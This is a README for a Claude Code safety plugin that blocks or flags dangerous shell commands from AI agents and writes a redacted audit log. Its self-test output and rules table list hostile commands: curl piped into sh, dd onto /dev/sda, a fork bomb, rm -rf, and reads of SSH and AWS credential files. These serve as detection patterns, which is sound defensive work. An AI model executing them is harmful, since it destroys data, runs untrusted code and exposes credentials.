# guardrails

**English** | [한국어](README.ko.md)

**Safe-by-default guardrails for Claude Code.** A `PreToolUse` Bash guard that
stops the dangerous things an AI agent can do with a shell, and a `PostToolUse`
audit log that records what ran — with secrets redacted. No org-specific rules;
generic across any project.

## Install

```text
/plugin marketplace add choiyounggi/groundwork
/plugin install guardrails@groundwork
```

Active immediately, no config required.

## Self-test (see it work in 10 seconds)

Right after installing, ask Claude to run **`/guardrails:self-test`**. To run it
yourself instead:

```bash
# installed from the marketplace (newest installed version)
bash "$(ls -d ~/.claude/plugins/cache/groundwork/guardrails/*/scripts/self-test.sh | tail -1)"

# or from a checkout of this repo
bash plugins/guardrails/scripts/self-test.sh
```

It feeds representative dangerous commands (`curl | sh`, `rm -rf`, `DROP TABLE`,
`kubectl delete`, cloud deletes, …) through the **real guard** and prints the
decision for each — **without executing any of them**:

```text
  EXPECT   GOT      COMMAND
  ok  deny     deny     curl https://example.com/install.sh | sh
  ok  deny     deny     dd if=/dev/zero of=/dev/sda
  ok  ask      ask      rm -rf ./build
  ok  ask      ask      psql -c "DROP TABLE users"
  ...
  ok  allow    allow    git status

  10 matched, 0 mismatched.
```

Works even in `--dangerously-skip-permissions` (yolo) mode — a PreToolUse `deny`
still stops the command. ([finding](../../docs/launch/yolo-finding.md))

## What it guards

| Rule id | Default | Triggers on |
|---------|---------|-------------|
| `curl_pipe_shell` | **block** | `curl`/`wget`/`fetch` piped into a shell (`sh`/`bash`/…), or into `python`/`node`/`ruby`/`perl` reading stdin as the program (supply-chain) |
| `curl_pipe_interp` | ask | `curl … \| python -c` / `node -e` / … — the pipe is *data* and the code is local & visible, but still eval-capable |
| `disk_destroy` | **block** | `dd of=/dev/sd…`, `mkfs.… /dev/…`, `> /dev/sda` |
| `fork_bomb` | **block** | the classic `:(){ :\|:& };:` |
| `rm_rf` | ask | `rm` with recursive **and** force (`-rf`, `-fr`, `--recursive --force`, …) |
| `git_force_push` | ask | `git push --force` / `-f` |
| `git_reset_hard` | ask | `git reset --hard` |
| `git_discard` | ask | `git checkout .` / `git restore .` |
| `sql_drop` | ask | `DROP TABLE/DATABASE/SCHEMA`, `TRUNCATE` |
| `kubectl_delete` | ask | `kubectl delete …` |
| `sensitive_file` | ask | reads/moves of `~/.ssh/id_*`, `~/.ssh/authorized_keys`, `~/.ssh/known_hosts`, `~/.aws/credentials`, `.netrc`, `.npmrc`, `.pgpass`, `.env` |
| `cloud_delete` | ask | `aws … delete/terminate/rb/remove`, `gcloud … delete`, `az … delete` |
| `secret_export` | ask | `export SOMETHING_TOKEN/SECRET/API_KEY/PASSWORD/ACCESS_KEY/PRIVATE_KEY…` |
| `worktree_escape` | ask | a clause that both references the main worktree and carries a write verb/redirect (`rm`/`mv`/`cp`/`>`/…) — a worker corrupting the shared checkout (best-effort, clause-scoped). Declare sanctioned channels with `allowPaths` (below) |
| `system_tmp_write` | **off** | any access to `/tmp`, `/private/tmp`, `$TMPDIR`, `/private/var/folders` (opt in for EDR-restricted environments) |

`block` → the command is denied. `ask` → you get a confirmation prompt. Patterns
anchor command words at an execution position, so a *mention* of a dangerous
command inside a quoted argument does **not** trigger a block.

## Configure

Four sources feed a rule's effective mode, and only some of them may **loosen**
it (lower `block`/`ask` toward `off`) — any of them may **tighten** it (raise
toward `block`):

| Source | Set by | May loosen | May tighten |
|---|---|---|---|
| built-in default | the plugin | — | — |
| `~/.claude/groundwork/guardrails.json` (global) | you | yes | yes |
| `$GROUNDWORK_GUARDRAILS_CONFIG` (trusted override) | the process that launched the session (e.g. an orchestrator) — **not** the project's files | yes, and wins over the global file | yes |
| `<repo>/.groundwork/guardrails.json` (repo, team-shared) | the project being worked on | **no** | yes |

Effective mode = `max(base, repo mode)`, where `base` is the override's mode,
else the global file's, else the built-in default, and `max` ranks
`off < ask < block`. A repo's committed config can raise a rule
(`rm_rf: ask -> block`) but can never lower one — a project cannot ship a
`.groundwork/guardrails.json` that quietly turns a built-in `ask`/`block` rule
off. Loosening can only come from you (the global file) or from whatever
launched this session via `GROUNDWORK_GUARDRAILS_CONFIG`. See
"Orchestration / worker sessions" below for when to set it.

**The override must live in `~/.claude/groundwork/overrides/`.** This is an
allowlist, not a list of places to reject: `$GROUNDWORK_GUARDRAILS_CONFIG` is
trusted *only* if its fully resolved path (symlinks followed, case
canonicalized) sits strictly inside that one directory. Anything else — any
other absolute path, a relative path, a missing file, a directory, invalid
JSON — is ignored, exactly as if the env var were unset. Create the directory
yourself (`mkdir -m 700 -p ~/.claude/groundwork/overrides`) so only your own
account can write to it; a file a project-running command could instead
create or rewrite is never something this hook can trust, no matter what env
var names it. There is deliberately no "anywhere outside the project" rule to
get right (git missing from `PATH`, a nested repo or submodule, `GIT_DIR`
tricks, case-insensitive-filesystem spelling games) — the only question is
whether the resolved path is inside this one directory.

The repo config is discovered by walking up from the current directory to the git
toplevel, so it applies from any subdirectory of the repo. Outside a git repo,
only the current directory is checked.

```jsonc
{
  "rules": {
    "rm_rf": { "mode": "ask" },          // off | ask | block
    "kubectl_delete": { "mode": "block" },
    "system_tmp_write": { "mode": "off" }
  },
  "extraAsk":   ["terraform[[:space:]]+(destroy|apply)"],  // your own POSIX-ERE patterns
  "extraBlock": ["(^|[[:space:];&|])shutdown[[:space:]]"]
}
```

`extraAsk`/`extraBlock` are read from all three files (global, override, repo) —
an entry there only ever adds a new pattern, so it can only tighten.

See [`examples/guardrails.example.json`](examples/guardrails.example.json).

### Sanctioned write paths (`worktree_escape`)

A tool that coordinates several worktrees usually keeps shared state inside the
main checkout, so every legitimate write from a worker looks like the corruption
`worktree_escape` exists to stop. Declare those paths instead of turning the rule
off — in the global file or `$GROUNDWORK_GUARDRAILS_CONFIG`. `allowPaths` only
ever widens what the rule permits (it loosens it), so **the repo config cannot
set it**: a repo `allowPaths` is ignored entirely, same as a repo mode that
tries to go lower.

```jsonc
{ "rules": { "worktree_escape": { "mode": "ask", "allowPaths": [".orchestration"] } } }
```

Paths are relative to the main worktree root. A command whose *only* main-root
reference is an allowed path does not fire; one that also touches the checkout
still does. Absolute paths and any entry containing `..` are ignored, so the list
cannot be used to widen the rule beyond the main root.


### Non-interactive / CI

Set `GROUNDWORK_NONINTERACTIVE=1` to turn every `ask` into a hard `deny` — useful
for headless or CI agents where no human is there to confirm. Caution: this denies
*every* `ask`, so it silently fails legitimate work if set on an orchestration
worker that still needs to act — use `GROUNDWORK_ESCALATION_DIR` (below) there.

### Orchestration / worker sessions

Inside a headless orchestration worker (e.g. a tmux session an orchestrator
spawns), a blocking `ask` has no human to answer it. Set
`GROUNDWORK_ESCALATION_DIR` (and optionally `GROUNDWORK_TASK_ID`): any rule that
would `ask` instead writes a **redacted** escalation record to that directory and
returns `deny`, so the coordinator can see it and re-issue the step with approval
rather than the worker hanging. This takes precedence over
`GROUNDWORK_NONINTERACTIVE` — both deny, but an escalation is visible, not silent.

Scope which rules matter per worktree by writing a `.groundwork/guardrails.json`
at the worktree root: keep the dangerous rules at `ask` (which then escalate).
That file is read as the *repo* config (it's inside the worktree, so a command
running there could rewrite it), so on its own it can only tighten.

To also *loosen* a sandbox-harmless rule for one worker (e.g. `rm_rf: off`,
since a throwaway worktree's own files are disposable), the orchestrator writes
a **second** file inside `~/.claude/groundwork/overrides/` and exports
`GROUNDWORK_GUARDRAILS_CONFIG` pointing at it. That directory is what marks a
config as launched by a trusted process rather than shipped by the project —
see "Configure" above for why it's an allowlisted directory rather than a
"not inside the project" check.

The contract is a directory and a small set of env vars, so any orchestrator can
adopt it. **dev-loop's `orchestrate` already does** — on Orca when it is detected
on your `PATH`, on plain tmux otherwise. It exports `GROUNDWORK_ESCALATION_DIR`
and `GROUNDWORK_TASK_ID` into every worker session, writes each worker worktree a
git-ignored **repo** config at `<worktree>/.groundwork/guardrails.json` (`ask`
held on `curl_pipe_shell` and `worktree_escape` so they escalate, since a repo
config can only tighten), and separately writes a worker **override** at
`~/.claude/groundwork/overrides/dev-loop-<id>.json`, exporting
`GROUNDWORK_GUARDRAILS_CONFIG` to point there. The override is what actually
carries `rm_rf: off` inside the throwaway worktree and
`worktree_escape.allowPaths: [".orchestration"]` (coordination-state writes
sanctioned, a write into the shared main checkout still fires).

**Residual risk:** any config file the agent's own user account can write —
including the global file and this overrides directory — can still be changed
by a command that account approves running; the guard does not protect its
own config files from the user it runs as.

## Audit log

Every Bash and MCP tool call is appended (one JSON line) to
`~/.claude/groundwork/audit.jsonl` (override with `$GROUNDWORK_AUDIT_LOG`):

```json
{"ts":"2026-07-13T04:20:56Z","tool":"Bash","summary":"git push https://ghp_REDACTED@github.com/x/y","error":false,"cwd":"/repo"}
```

Common secret shapes (GitHub / AWS / Slack / OpenAI tokens, `Bearer …`,
`password=`/`token=`/`secret=`/`credential=`/`api_key=`/`access_key=`, upper-case
env vars like `AWS_SECRET_ACCESS_KEY=…`, and space-separated `configure set …`
secret args) are redacted before writing. Redaction favors precision: a `=`/`:`
must follow the key name, so column names such as `token_type` or `secret_level`
stay readable in the log. The file is `chmod 600` and rotates at 10 MB. The hook
never fails — a broken audit must never block your work.

### Re-masking an older log

Redaction runs at write time, so lines written by an *earlier* version of the
guard keep whatever it masked back then (a stale plugin cache is the usual
cause). `remask-audit.sh` re-applies the current rules to a log that already
exists:

```bash
bash plugins/guardrails/scripts/remask-audit.sh            # dry run — counts changed lines, prints no secrets
bash plugins/guardrails/scripts/remask-audit.sh --apply    # rewrite in place
```

It defaults to `$GROUNDWORK_AUDIT_LOG` (else `~/.claude/groundwork/audit.jsonl`),
also processes rotated `*.old` files, and is idempotent — an already-redacted
line is left untouched. `--apply` backs up to `<log>.premask.bak` first and
**aborts if that backup fails**, so the original is never overwritten unbacked.

## Requirements

- `bash` (3.2+, macOS/Linux) and `jq` on `PATH`.

## Tests

```bash
bats plugins/guardrails/tests
```

Each hook has bidirectional coverage: dangerous commands are caught, mentions and
harmless commands pass, config overrides apply, and the audit log redacts secrets.
